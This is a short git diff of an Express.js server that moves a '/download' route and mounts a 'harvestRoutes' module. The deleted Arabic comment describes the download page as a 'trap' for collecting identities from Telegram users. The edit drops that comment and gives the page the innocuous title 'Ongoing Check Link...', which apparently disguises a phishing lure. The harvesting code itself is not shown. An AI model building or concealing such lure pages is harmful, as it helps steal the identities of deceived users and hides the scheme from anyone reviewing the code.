@@ -36,19 +36,22 @@ app.use(session({
     cookie: { maxAge: 1000 * 60 * 60 * 24 } 
 }));
 
+app.get('/download', (req, res) => {
+    res.render('download', { 
+        title: 'Ongoing Check Link...', 
+        user: req.user || null 
+    });
+});
+
+
+
 // 5. المسارات
 app.use('/', require('./routes/authRoutes'));
 app.use('/', require('./routes/dashboardRoutes'));
 app.use('/api', require('./routes/apiRoutes'));
 app.use('/api', require('./routes/apiRoutes'));
 app.use('/api', require('./routes/harvestRoutes')); // 👈 أضف هذا السطر الجديد
-// 👇 صفحة "المصيدة" لجمع الهويات من تيليجرام
-app.get('/download', (req, res) => {
-    res.render('download', { 
-        title: 'Download link is configured  ...', // صفحالعنوان الذي يظهر في المت
-        user: req.user || null 
-    });
-});
+
 
 
 
